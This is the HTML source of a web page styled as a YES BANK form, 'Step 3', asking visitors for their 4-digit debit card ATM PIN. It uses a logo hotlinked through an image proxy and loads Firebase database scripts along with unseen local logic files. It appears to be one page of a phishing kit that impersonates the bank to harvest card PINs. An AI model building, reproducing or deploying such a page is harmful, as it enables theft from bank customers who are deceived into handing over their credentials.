<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>iris - YES BANK - Step 3</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: sans-serif;
      background: #fff;
      padding: 20px;
      margin: 0;
    }

    .container {
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
    }

    .logo {
      text-align: center;
      margin-bottom: 10px;
    }

    .logo img {
      width: 150px;
      display: block;
      margin: 0 auto;
    }

    .section-title {
      text-align: center;
      font-weight: bold;
      text-transform: uppercase;
      font-size: 14px;
      margin: 30px 0 20px;
    }

    label {
      display: block;
      margin: 10px 0 5px;
      font-weight: bold;
      font-size: 14px;
    }

    input[type="password"] {
      width: 100%;
      padding: 10px;
      border: none;
      border-bottom: 1px solid #aaa;
      margin-bottom: 15px;
      font-size: 16px;
      background: transparent;
    }

    .button-group {
      display: flex;
      justify-content: space-between;
      margin-top: 30px;
    }

    .button-group button {
      flex: 1;
      padding: 12px;
      margin: 0 5px;
      border-radius: 25px;
      font-size: 16px;
      border: none;
      cursor: pointer;
    }

    .back-button {
      background-color: #fff;
      border: 1px solid #e91e63;
      color: #e91e63;
    }

    .submit-button {
      background-color: #e91e63;
      color: white;
    }

    .submit-button:disabled {
      background-color: #ccc;
      color: #666;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://imgs.search.brave.com/a7JunU7klRpwmMvss_0rtLG3kgr_sJ8rXiUqnEbMq_0/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9icmFu/ZGVwcy5jb20vbG9n/by1kb3dubG9hZC9Z/L1llcy1CYW5rLWxv/Z28tdmVjdG9yLTAx/LnN2Zw" alt="YES BANK Logo">
    </div>

    <div class="section-title">Enter Debit Card PIN</div>

    <form id="pinForm">
      <label for="pin">ATM PIN</label>
      <input type="password" id="pin" maxlength="4" minlength="4" placeholder="Enter your 4-digit PIN" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />

      <div class="button-group">
        <button type="button" class="back-button" onclick="history.back()">Back</button>
        <button type="submit" class="submit-button" id="submitBtn" disabled>Submit</button>
      </div>
    </form>
  </div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <!-- Config + Logic -->
  <script src="firebase-config.js"></script>
  <script src="3.js"></script>
</body>
</html>
